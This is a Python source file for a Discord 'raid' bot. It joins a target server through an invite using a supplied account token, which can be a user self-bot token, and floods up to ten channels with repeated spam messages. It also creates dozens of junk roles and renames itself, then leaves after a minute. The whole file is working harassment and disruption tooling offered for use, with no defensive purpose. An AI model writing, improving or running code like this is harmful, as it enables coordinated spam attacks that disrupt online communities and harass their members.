import discord
import aiohttp
import asyncio
import random
from discord.ext import commands
from config import Colors

class Raider(commands.Bot):
    def __init__(self, token, invite_code, spam_messages, delay=0.1):
        intents = discord.Intents.all()
        super().__init__(command_prefix='!', intents=intents)
        self.token = token
        self.invite = invite_code
        self.messages = spam_messages
        self.delay = delay
        
    async def on_ready(self):
        print(f"{Colors.GREEN}[+] Raider: {self.user}{Colors.RESET}")
        await self.execute_raid()
    
    async def execute_raid(self):
        try:
            # Join server
            await self.join_server()
            
            # Find guild and spam
            guild = self.guilds[-1]
            print(f"{Colors.YELLOW}[+] Raiding: {guild.name}{Colors.RESET}")
            
            for channel in guild.text_channels[:10]:  # First 10 channels
                if channel.permissions_for(guild.me).send_messages:
                    asyncio.create_task(self.raid_channel(channel))
            
            # Chaos mode
            asyncio.create_task(self.chaos_mode(guild))
            
            await asyncio.sleep(60)  # Raid duration
            await guild.leave()
            
        except Exception as e:
            print(f"{Colors.RED}[-] Raid error: {e}{Colors.RESET}")
        finally:
            await self.close()
    
    async def join_server(self):
        url = f"https://discord.com/api/v10/invites/{self.invite}"
        headers = {"Authorization": self.token}
        async with aiohttp.ClientSession() as session:
            async with session.post(url, headers=headers) as resp:
                pass  # Join happens automatically
    
    async def raid_channel(self, channel):
        for _ in range(50):
            try:
                await channel.send(random.choice(self.messages))
                await asyncio.sleep(self.delay)
            except:
                continue
    
    async def chaos_mode(self, guild):
        try:
            await guild.me.edit(nick="🌀RAIDER🌀")
            for _ in range(25):
                await guild.create_role(name=f"raid-{random.randint(1000,9999)}")
        except:
            pass
    
    async def run(self):
        await self.start(self.token, bot=False)
